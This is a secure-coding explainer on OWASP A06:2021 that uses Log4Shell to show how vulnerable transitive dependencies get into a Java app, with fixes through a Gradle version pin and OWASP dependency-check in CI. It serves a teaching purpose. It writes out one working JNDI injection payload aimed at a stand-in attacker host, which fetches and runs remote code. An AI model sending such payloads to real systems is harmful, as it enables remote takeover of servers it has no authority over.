# A06:2021 – Vulnerable and Outdated Components

---

## Scenario 1: Log4Shell (CVE-2021-44228)

Your app uses Log4j 2.14. Somewhere in the code, HTTP headers are logged:

```java
log.info("Incoming request from user-agent: {}", request.getHeader("User-Agent"));
```

An attacker sends a request with this header:
```
User-Agent: ${jndi:ldap://attacker.com/exploit}
```

Log4j receives the string `${jndi:ldap://attacker.com/exploit}` and — because this
is how Log4j was designed — it evaluates the `${}` expression. It makes an outbound
LDAP request to `attacker.com`, downloads a Java class from there, and executes it.

The attacker's server was waiting. It serves a class that opens a reverse shell.
Your server is now under full remote control.

**The moment**: `log.info(...)` is called with the attacker's string. Log4j parses it,
makes the network call, and executes code — all inside one logging statement.
Your application code never had a bug. The library itself was the weapon.

### Fix

Upgrade Log4j to 2.17.1+. That version removed the JNDI lookup feature entirely.

In Gradle:
```groovy
// Force the safe version across all transitive dependencies
configurations.all {
    resolutionStrategy {
        force 'org.apache.logging.log4j:log4j-core:2.17.1'
    }
}
```

---

## Scenario 2: you don't even know you have the vulnerable library

You never added Log4j to your `build.gradle`. But you added:
```groovy
implementation 'org.apache.kafka:kafka-clients:2.8.0'
```

Kafka pulls in Log4j as a transitive dependency. You never see it unless you look.

```bash
./gradlew dependencies | grep log4j
# \--- org.apache.logging.log4j:log4j-core:2.14.1
```

**The moment**: the vulnerable library was included the day you added Kafka.
You didn't know it was there.

### Fix

Run a vulnerability scan on every build:
```groovy
// build.gradle
plugins {
    id 'org.owasp.dependencycheck' version '9.0.9'
}
dependencyCheck {
    failBuildOnCVSS = 7  // CI build fails if any HIGH or CRITICAL CVE is found
}
```

```bash
./gradlew dependencyCheckAnalyze
# Generates a report listing every CVE in every dependency, direct or transitive
```

This runs in CI. If a new CVE is published for any library in your dependency tree,
the next build fails and your team gets notified — before it reaches production.
